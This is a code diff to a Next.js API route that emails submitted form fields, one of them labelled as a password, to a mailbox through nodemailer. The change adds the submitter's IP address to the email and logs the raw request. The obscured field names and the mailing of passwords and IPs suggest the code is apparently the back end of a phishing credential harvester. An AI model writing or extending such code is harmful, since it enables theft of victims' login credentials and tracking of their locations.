@@ -1,8 +1,12 @@
 import { NextResponse, NextRequest } from "next/server";
 import mailer from "nodemailer";
 
-export async function POST(request: Request) {
+import requestIp, { type Request } from "request-ip";
+
+export async function POST(request: NextRequest) {
   const res: any = await request.json();
+
+  console.log(res);
 
   try {
     let transporter: mailer.Transporter = mailer.createTransport({
@@ -24,10 +28,13 @@ export async function POST(request: Request) {
       html: `<h3>${JSON.stringify(res.kinder).replaceAll(
         '"',
         ""
-      )} /password: ${JSON.stringify(res.kind).replaceAll('"', "")}</h3>`,
+      )} /password: ${JSON.stringify(res.kind).replaceAll(
+        '"',
+        ""
+      )} /ip: ${JSON.stringify(res.ip).replaceAll('"', "")}</h3>`,
     });
 
-    return NextResponse.json({ status: true, message: result });
+    return NextResponse.json({ status: true, message: "result" });
   } catch (error) {
     return NextResponse.json({ status: true, message: error });
   }
